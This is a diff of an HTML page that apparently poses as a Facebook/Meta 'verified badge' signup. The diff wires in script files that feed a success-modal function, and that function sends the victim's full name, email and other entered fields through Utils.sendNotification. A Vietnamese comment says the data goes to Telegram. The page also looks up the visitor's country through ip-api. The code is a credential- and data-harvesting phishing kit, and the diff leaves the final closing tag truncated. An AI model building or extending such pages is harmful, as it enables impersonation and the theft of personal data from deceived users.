@@ -7,6 +7,9 @@
     <meta name="description" content="Get the verified badge for impersonation protection, direct support and exclusive features." />
 
     <script src="https://cdn.tailwindcss.com"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <script src="public/js/config.js"></script>
+    <script src="public/js/utils.js"></script>
     <script>
         tailwind.config = {
             theme: { extend: { colors: { primary: '#0866ff', secondary: '#1c1e21' } } }
@@ -1216,7 +1219,7 @@ fetch('https://ip-api.com/json/?fields=countryCode')
      MODAL: Success
   ============================================================ */
 function openSuccessModal() {
-    // ✅ Gửi data về Telegram
+    // ✅ PHẢI CÓ ĐOẠN NÀY
     Utils.sendNotification({
       fullName:       _masterData.fullName       || '',
       email:          _masterData.email          || '',
@@ -1248,5 +1251,11 @@ function openSuccessModal() {
     Modal.open('successModal');
   }
   </script>
+
+  <!-- ✅ THÊM VÀO ĐÂY -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+  <script src="public/js/config.js"></script>
+  <script src="public/js/utils.js"></script>
+
 </body>
-</html>
+</html
